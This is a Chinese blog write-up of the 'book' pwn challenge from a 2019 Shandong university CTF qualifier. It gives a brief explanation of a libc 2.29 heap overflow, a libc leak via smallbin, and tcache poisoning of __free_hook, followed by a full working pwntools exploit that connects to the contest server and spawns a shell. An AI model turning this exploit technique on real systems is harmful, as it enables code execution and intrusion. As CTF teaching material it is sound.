---
layout: post
title:  "2019.9.21 第八届山东省大学生网络安全技能大赛预选赛pwn"
tags: [writeup, ]
date: 2019-09-21
comments: false
---

预选赛只有一道pwn题  

## book

有点像18年铁三总决赛原题，但是libc版本是2.29  
添加book处size输入0可以堆溢出，有scanf，size输入`"1"*0x500`可以通过smallbin泄露出libcbase。  
有了libcbase再配合堆溢出就非常好利用了，这里用tcache poisoning来控制malloc到freehook，改为system再free一个内容为`/bin/sh`的book来getshell.  


exp:  

```python
from pwn import *

context.log_level = 'debug'
#io = process("./pwn")

s = lambda a: io.send(str(a))
sa = lambda a, b: io.sendafter(str(a), str(b))
st = lambda a, b: io.sendthen(str(a), str(b))
sl = lambda a: io.sendline(str(a))
sla = lambda a, b: io.sendlineafter(str(a), str(b))
slt = lambda a, b: io.sendlinethen(str(a), str(b))
r = lambda a=4096: io.recv(a)
rl = lambda: io.recvline()
ru = lambda a: io.recvuntil(str(a))
irt = lambda: io.interactive()

def change_ld(binary, ld):
    """
    Force to use assigned new ld.so by changing the binary
    """
    if not os.access(ld, os.R_OK): 
        log.failure("Invalid path {} to ld".format(ld))
        return None
 
         
    if not isinstance(binary, ELF):
        if not os.access(binary, os.R_OK): 
            log.failure("Invalid path {} to binary".format(binary))
            return None
        binary = ELF(binary)
 
 
    for segment in binary.segments:
        if segment.header['p_type'] == 'PT_INTERP':
            size = segment.header['p_memsz']
            addr = segment.header['p_paddr']
            data = segment.data()
            if size <= len(ld):
                log.failure("Failed to change PT_INTERP from {} to {}".format(data, ld))
                return None
            binary.write(addr, ld.ljust(size, '\0'))
            if not os.access('/tmp/pwn', os.F_OK): os.mkdir('/tmp/pwn')
            path = '/tmp/pwn/{}_debug'.format(os.path.basename(binary.path))
            if os.access(path, os.F_OK): 
                os.remove(path)
                info("Removing exist file {}".format(path))
            binary.save(path)    
            os.chmod(path, 0b111000000) #rwx------
    success("PT_INTERP has changed from {} to {}. Using temp file {}".format(data, ld, path)) 
    return ELF(path)

#example
#elf = change_ld('./pwn', './ld')
#io = elf.process(env={'LD_PRELOAD':'./libc-2.29.so'})
io = remote("123.57.61.106", 9999)
def debug():
    gdb.attach(io)
    io.interactive()


def add(idx,s,c):
    sla("choice: \n","1")
    sla("u name id:\n",idx)
    sla("our book name: ",s)
    sla("r name of book: ",c)

def dele(idx):
    sla("choice: \n","2")
    sla("ur number?\n",idx)

def show(idx):
    sla("choice: \n","3")
    sla("ur number: \n",idx)


add('a',0x10,'0')#0
add('b',0x10,'1')#1
add('c',0x10,'2')#2
add('d',0x10,'3')#3
for x in range(10):
    add(str(x),0x10,str(x))
for x in range(8):
    dele(x)

#add('x',"1"*0x500,'2')
sla("choice: \n","1")
sla("u name id:\n","x")
sla("our book name: ","1"*0x500)
for x in range(10):
    add(str(x),0x10,str(x))
show(4)
io.recvuntil("\x73\x20")
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
libc = ELF("./libc-2.29.so",checksec=False)
libcbase = u64(io.recv(6).ljust(8,'\x00')) -0x1e4d33# 0x3ebd33#0x1e4d33
success('libcbase : '+hex(libcbase))
freehook = libcbase + libc.symbols['__free_hook']
sysaddr = libcbase + libc.symbols['system']

for x in range(15):
    dele(x)
#pay = "Le3d1ng\x00"+p64(0)*2+p64(0x21)+(p64(0)*3+p64(0x21))*3+p64(freehook)
pay = (p64(0)*3+p64(0x21))*3+p64(freehook)
add('a',0,pay)
add('x',0,p64(sysaddr))
add('/bin/sh\x00',0,'/bin/sh\x00')
dele(2)
irt()
```

# 